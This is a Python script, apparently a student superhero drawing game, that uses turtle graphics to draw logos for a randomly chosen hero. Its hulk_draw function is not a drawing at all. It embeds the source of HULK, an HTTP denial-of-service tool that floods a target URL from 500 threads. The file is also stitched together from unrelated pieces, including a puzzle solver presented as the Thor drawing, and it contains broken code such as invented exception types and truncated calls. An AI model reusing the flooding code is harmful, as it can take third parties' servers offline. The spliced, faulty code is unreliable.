import random
import turtle
import math
def hulk_draw():
  # ----------------------------------------------------------------------------------------------
  # HULK - HTTP Unbearable Load King
  #
  # this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
  # to their knees by exhausting the resource pool, its is meant for research purposes only
  # and any malicious usage of this tool is prohibited.
  #
  # author :  Barry Shteiman , version 1.0
  # ----------------------------------------------------------------------------------------------
  import urllib.request
  import sys
  import threading
  import random
  import re
  # import json
  import datetime

  #global params
  url=''
  host=''
  headers_useragents=[]
  headers_referers=[]
  request_counter=0
  flag=0
  safe=0

  def inc_counter():
    global request_counter
    request_counter+=1

  def set_flag(val):
    global flag
    flag=val

  def set_safe():
    global safe
    safe=1

  # generates a user agent array
  def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    return(headers_useragents)

  # generates a referer array
  def referer_list():
    global headers_referers
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://' + host + '/')
    return(headers_referers)

  #builds random ascii string
  def buildblock(size):
    out_str = ''
    for i in range(0, size):
      a = random.randint(65, 90)
      out_str += chr(a)
    return(out_str)

  def usage():
    print ('---------------------------------------------------')
    print ('USAGE: python hulk.py <url>')
    print('you can add "safe" after url, to autoshut after dos')
    print ('---------------------------------------------------')

  # def log(request):
    # global request_counter
    # print datetime.datetime.now(), 'REQUEST COUNT :', request_counter, '>>>', request.get_full_url()
    # print request.get_method()
    # print json.dumps(request.headers, indent=4, sort_keys=True)
    # print dir(request)  # list lots of other stuff in Request

  #http request
  def httpcall(url):
    useragent_list()
    referer_list()
    code=0
    if url.count("?")>0:
      param_joiner="&"
    else:
      param_joiner="?"
    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
    request.add_header('Keep-Alive', random.randint(110,120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host',host)
    try:
        inc_counter()
        # log(request)
        urllib.request.urlopen(request)
    except FileNotFoundError as e:
        print (math.e.code)
        set_flag(1)
        print ('Response Code 500')
        code=500
    except FileNotFoundError as e:
        print (e.reason)
        sys.exit()
    # else:
        # log(request)
        # inc_counter()
        # urllib.request.urlopen(request)
    return(code)		


  #http caller thread 
  class HTTPThread(threading.Thread):
    def run(self):
      try:
        while flag<2:
          code=httpcall(url)
          if (code==500) & (safe==1):
            set_flag(2)
      except SomeExceptionType as e:
        pass

  # monitors http threads and counts requests
  class MonitorThread(threading.Thread):
    def run(self):
      previous=request_counter
      while flag==0:
        if (previous+100<request_counter) & (previous!=request_counter):
          print ("%d Requests Sent @" % (request_counter), datetime.datetime.now())
          previous=request_counter
      if flag==2:
        print("\n-- HULK Attack Finished --", datetime.datetime.now())

  #execute 
  if len(sys.argv) < 2:
    usage()
    sys.exit()
  else:
    if sys.argv[1]=="help":
      usage()
      sys.exit()
    else:
      print ("-- HULK Attack Started --", datetime.datetime.now())
      if len(sys.argv)== 3:
        if sys.argv[2]=="safe":
          set_safe()
      url = sys.argv[1]
      if url.count("/")==2:
        url = url + "/"
      m = re.search('https?\://([^/]*)/?.*', url)
      host = m.group(1)
      # print httpcall(url)
      for i in range(500):
        t = HTTPThread()
        t.start()
      t = MonitorThread()
      t.start()
def captian_draw():


  t = turtle.Turtle()


  def ankur(x, y):
      t.penup()
      t.goto(x, y)
      t.pendown()
      t.setheading(0)
      t.pensize(2)
      t.speed(10)


  def golo(r, color):
      x_point = 0
      y_pont = -r
      ankur(x_point, y_pont)
      t.pencolor(color)
      t.fillcolor(color)
      t.begin_fill()
      t.circle(r)
      t.end_fill()


  def paanch(r, color):
      ankur(0, 0)
      t.pencolor(color)
      t.setheading(162)
      t.forward(r)
      t.setheading(0)
      t.fillcolor(color)
      t.begin_fill()
      for i in range(5):
          t.forward(math.cos(math.radians(18)) * 2 * r)  # 2cos18°*r
          t.right(144)
      t.end_fill()
      t.hideturtle()


  if __name__ == '__main__':
      golo(288, 'crimson')
      golo(234, 'snow')
      golo(174, 'crimson')
      golo(114, 'blue')
      paanch(114, 'snow')
      turtle.done()
def ironman_draw():
  ankur1 = [[(-40, 120), (-70, 260), (-130, 230), (-170, 200), (-170, 100),
             (-160, 40), (-170, 10), (-150, -10), (-140, 10), (-40, -20),
             (0, -20)],
            [(0, -20), (40, -20), (140, 10), (150, -10), (170, 10), (160, 40),
             (170, 100), (170, 200), (130, 230), (70, 260), (40, 120),
             (0, 120)]]
  ankur2 = [[(-40, -30), (-50, -40), (-100, -46), (-130, -40), (-176, 0),
             (-186, -30), (-186, -40), (-120, -170), (-110, -210), (-80, -230),
             (-64, -210), (0, -210)],
            [(0, -210), (64, -210), (80, -230), (110, -210), (120, -170),
             (186, -40), (186, -30), (176, 0), (130, -40), (100, -46),
             (50, -40), (40, -30), (0, -30)]]
  ankur3 = [[(-60, -220), (-80, -240), (-110, -220), (-120, -250), (-90, -280),
             (-60, -260), (-30, -260), (-20, -250), (0, -250)],
            [(0, -250), (20, -250), (30, -260), (60, -260), (90, -280),
             (120, -250), (110, -220), (80, -240), (60, -220), (0, -220)]]

  turtle.hideturtle()
  turtle.bgcolor('#ba161e')  # Dark Red
  turtle.setup(500, 600)
  turtle.title("I AM IRONMAN")
  ankur1Goto = (0, 120)
  ankur2Goto = (0, -30)
  ankur3Goto = (0, -220)
  turtle.speed(2)

  def logo(a, b):
    turtle.penup()
    turtle.goto(b)
    turtle.pendown()
    turtle.color('#fab104')  # Light Yellow
    turtle.begin_fill()

    for i in range(len(a[0])):
      x, y = a[0][i]
      turtle.goto(x, y)

    for i in range(len(a[1])):
      x, y = a[1][i]
      turtle.goto(x, y)
      turtle.end_fill()

  logo(ankur1, ankur1Goto)
  logo(ankur2, ankur2Goto)
  logo(ankur3, ankur3Goto)
  turtle.hideturtle()
  turtle.done()
def batman_draw():
  kalam = turtle.Turtle()
  kalam.speed(500)

  window = turtle.Screen()
  window.bgcolor("#000000")
  kalam.color("yellow")

  ankur = 20

  kalam.left(90)
  kalam.penup()
  kalam.goto(-7 * ankur, 0)
  kalam.pendown()

  for a in range(-7 * ankur, -3 * ankur, 1):
    x = a / ankur
    rel = math.fabs(x)
    y = 1.5 * math.sqrt(
        (-math.fabs(rel - 1)) * math.fabs(3 - rel) /
        ((rel - 1) *
         (3 - rel))) * (1 + math.fabs(rel - 3) /
                        (rel - 3)) * math.sqrt(1 - (x / 7)**2) + (
                            4.5 + 0.75 *
                            (math.fabs(x - 0.5) + math.fabs(x + 0.5)) - 2.75 *
                            (math.fabs(x - 0.75) + math.fabs(x + 0.75))) * (
                                1 + math.fabs(1 - rel) / (1 - rel))
    kalam.goto(a, y * ankur)

  for a in range(-3 * ankur, -1 * ankur - 1, 1):
    x = a / ankur
    rel = math.fabs(x)
    y = (2.71052 + 1.5 - 0.5 * rel -
         1.35526 * math.sqrt(4 - (rel - 1)**2)) * math.sqrt(
             math.fabs(rel - 1) / (rel - 1))
    kalam.goto(a, y * ankur)

  kalam.goto(-1 * ankur, 3 * ankur)
  kalam.goto(int(-0.5 * ankur), int(2.2 * ankur))
  kalam.goto(int(0.5 * ankur), int(2.2 * ankur))
  kalam.goto(1 * ankur, 3 * ankur)
  print("Batman Logo with Python Turtle")
  for a in range(1 * ankur + 1, 3 * ankur + 1, 1):
    x = a / ankur
    rel = math.fabs(x)
    y = (2.71052 + 1.5 - 0.5 * rel -
         1.35526 * math.sqrt(4 - (rel - 1)**2)) * math.sqrt(
             math.fabs(rel - 1) / (rel - 1))
    kalam.goto(a, y * ankur)

  for a in range(3 * ankur + 1, 7 * ankur + 1, 1):
    x = a / ankur
    rel = math.fabs(x)
    y = 1.5 * math.sqrt(
        (-math.fabs(rel - 1)) * math.fabs(3 - rel) /
        ((rel - 1) *
         (3 - rel))) * (1 + math.fabs(rel - 3) /
                        (rel - 3)) * math.sqrt(1 - (x / 7)**2) + (
                            4.5 + 0.75 *
                            (math.fabs(x - 0.5) + math.fabs(x + 0.5)) - 2.75 *
                            (math.fabs(x - 0.75) + math.fabs(x + 0.75))) * (
                                1 + math.fabs(1 - rel) / (1 - rel))
    kalam.goto(a, y * ankur)

  for a in range(7 * ankur, 4 * ankur, -1):
    x = a / ankur
    rel = math.fabs(x)
    y = (-3) * math.sqrt(1 - (x / 7)**2) * math.sqrt(
        math.fabs(rel - 4) / (rel - 4))
    kalam.goto(a, y * ankur)

  for a in range(4 * ankur, -4 * ankur, -1):
    x = a / ankur
    rel = math.fabs(x)
    y = math.fabs(
        x / 2) - 0.0913722 * x**2 - 3 + math.sqrt(1 -
                                                  (math.fabs(rel - 2) - 1)**2)
    kalam.goto(a, y * ankur)

  for a in range(-4 * ankur - 1, -7 * ankur - 1, -1):
    x = a / ankur
    rel = math.fabs(x)
    y = (-3) * math.sqrt(1 - (x / 7)**2) * math.sqrt(
        math.fabs(rel - 4) / (rel - 4))
    kalam.goto(a, y * ankur)

  kalam.penup()
  kalam.goto(300, 300)
  turtle.don
def thor_draw():
  import sys
  import math

  # Auto-generated code below aims at helping you parse
  # the standard input according to the problem statement.
  # ---
  # Hint: You can use the debug stream to print initialTX and initialTY, if Thor seems not follow your orders.

  # light_x: the X position of the light of power
  # light_y: the Y position of the light of power
  # initial_tx: Thor's starting X position
  # initial_ty: Thor's starting Y position
  light_x, light_y, initial_tx, initial_ty = [int(i) for i in input().split()]
  thor_x, thor_y = initial_tx, initial_ty
  # game loop
  while True:
      remaining_turns = int(input())  # The remaining amount of turns Thor can move. Do not remove this line.
      direction_x = ""
      direction_y = ""

      if thor_x == light_x:
          if thor_y > light_y:
              direction_y = "N"
              thor_y -= 1
          elif thor_y < light_y:
              direction_x = "S"
              thor_y += 1

      elif thor_y == light_y:
          if thor_x > light_x:
              direction_x = "W"
              thor_x -= 1
          elif thor_x < light_x:
              direction_y = "E"
              thor_x += 1

      elif thor_x != light_x and thor_y != light_y:
          if thor_y > light_y and thor_x > light_x :
              direction_y = "NW"
              thor_x -= 1
              thor_y -= 1
          elif thor_y > light_y and thor_x < light_x :
              direction_y = "NE"
              thor_x += 1
              thor_y -= 1
          elif thor_y < light_y and thor_x > light_x :
              direction_x = "SW"
              thor_x -= 1
              thor_y += 1
          elif thor_y < light_y and thor_x < light_x :
              direction_x = "SE"
              thor_x += 1
              thor_y += 1

      # Write an action using print
      # To debug: print("Debug messages...", file=sys.stderr)


      # A single line providing the move to be made: N NE E SE S SW W or NW
      print(direction_y + direction_x)
def superman_draw():

  t = turtle.Turtle(
  )  #set the variable ‘t’ to the function turtle.Turtle() to shorten the code throughout
  turtle.Screen().bgcolor(
      'navy')  #set the color of the screen to navy to match Superman’s costume

  def curve(value):  #create a function to generate curves in turtle
    for i in range(
        value):  #for loop to repeat the inputted value number of times
      t.right(1)  #step by step curve
      t.forward(1)

  t.penup()  #pen is in the up position so it will not draw
  t.setposition(0, 43)  #move the pen to these x and y coordinates
  t.pendown()  #pen is in the down position so it will draw
  t.begin_fill()  #start filling in the shape
  t.pencolor('black')  #change the pen color to black
  t.fillcolor(
      'maroon'
  )  #change the shape fill color to maroon to match the Superman logo
  t.pensize(3)  #use a pen size of 3 to create a black border
  t.forward(
      81.5
  )  #the pen will move forward this number to start the shield of the logo
  t.right(49.4)  #rotate the pen right 49.4 degrees
  t.forward(58)  #move the pen forward by 58
  t.right(81.42)  #rotate right by 81.42 degrees
  t.forward(182)  #move the pen forward by 182
  t.right(98.36)  #rotate the pen right by 98.36 degrees
  t.forward(182)  #move the pen forward by 182
  t.right(81.42)  #rotate the pen by 81.42 degrees to the right
  t.forward(58)  #move the pen forward 58
  t.right(49.4)  #rotate the pen to the right by 49.4
  t.forward(
      81.5
  )  #move the pen forward by 81.5 to meet the start at the top of the shield
  t.end_fill()  #complete the fill of the shield so the shape is closed off
  t.penup()  #pen will not draw

  t.setposition(38, 32)  #now to create the yellow parts of the Superman logo
  t.pendown()  #the pen is now poised to draw
  t.begin_fill()  #start a new shape
  t.fillcolor(
      'gold')  #change the fill color to gold to match the Superman logo
  t.forward(13)  #move the pen forward by 13
  t.right(120)  #rotate the pen right by 120 degrees
  t.forward(13)  #move the pen forward by 13
  t.right(120)  #rotate the pen right by 120 degrees
  t.forward(13)  #move the pen forward by 13
  t.end_fill()  #the small triangle on the right is now complete
  t.penup()  #stop the pen from drawing

  t.setposition(
      81.5, 25
  )  #now to create the larger yellow part of the Superman logo, change the position of the pen
  t.pendown()  #the pen will now draw again
  t.begin_fill()  #the fill is still the same color set before
  t.right(210)  #rotate the pen right by 210 degrees
  t.forward(25)  #move the pen forward by 25
  t.right(90)  #rotate the pen right by 90 degrees
  t.forward(38)  #move the pen forward by 38
  t.right(45)  #rotate the pen right by 45 degrees
  t.circle(
      82, 90
  )  #this function is used to draw a circle in turtle, the first integer is the radius and the second is the number of degrees of the circle drawn
  t.left(90)  #rotate the pen left by 90 degrees
  t.circle(
      82, 60
  )  #create a circle of radius 82 and only complete 60 degrees of the circle
  curve(
      61
  )  #call the curve function that was previously defined, pass an integer value equal to the length of the curve desired
  t.left(90)  #rotate the pen left by 90 degrees
  t.forward(57)  #move the pen forward by 57
  t.left(90)  #rotate the pen left by 90 degrees
  t.forward(32)  #move the pen forward by 32
  t.end_fill()  #fill in the larger yellow part of the logo
  t.penup()  #stop drawing
  t.home(
  )  #reset the pen location to the origin so the orientation is also reset

  t.setposition(
      -69, -38)  #finish the major parts of the S superimposition on the shield
  t.pendown()
  t.begin_fill()
  curve(20)
  t.forward(33)
  t.left(10)
  t.circle(82, 20)
  curve(30)
  t.forward(10)
  t.right(110)
  curve(40)
  t.right(10)
  t.circle(50, 10)
  curve(45)
  t.right(5)
  t.forward(45)
  t.end_fill()
  t.penup()
  t.home()

  t.setposition(20, -100)
  t.pendown()
  t.begin_fill()
  t.right(135)
  t.forward(27)
  t.right(90)
  t.forward(27)
  t.right(135)
  t.forward(38.18)
  t.end_fill()
  t.penup()
  t.home()

  t.setposition(-57, 32)
  t.pendown()
  t.begin_fill()
  t.right(180)
  t.forward(18)
  t.left(45)
  t.forward(44)
  t.left(80)
  t.forward(15)
  t.left(130)
  curve(40)
  t.forward(20)
  t.end_fill()

  t.hideturtle(
  )  #use this command to hide the turtle so it is not visible in the final image
  turtle.exitonclick(
  )  #this command will leave the window open until it is clicked
while True:
  def get_user_name():
    name = input('What is your name?\n')
    print('Hi, %s.' % name)
    return name
  def select_hero(name):
    vowels = ['A', 'E', 'I', 'O', 'U']
    if name[0].upper() in vowels:
      superheroes = [ "Batman", "Iron Man", "Captain America", "Thor", "Hulk","Aquaman","Black Panter","Dr.Strange","Captain America","Wolverine","Thor","Hulk","Captain Marvel"]
    else:
      superheroes = ["Batman", "Iron Man", "Captain America", "Thor", "Hulk","Aquaman","Black Panter","Superman""Dr.Strange","Captain America","Wolverine","Iron Man","Thor","Hulk","Captain Marvel"  ]
    return random.choice(superheroes)
  def main():
    name = get_user_name()
    random_hero = select_hero(name)
    print("You have to design " + random_hero)
    if random_hero == "Superman":
      superman_draw()
    if random_hero == "Batman":
      batman_draw()
    if random_hero == "Iron Man":
      ironman_draw()
    if random_hero == "Captian America":
      captian_draw()  
    if random_hero == "Thor":
      thor_draw()
  
  
  main()
  if __name__ == "__main__":
    main()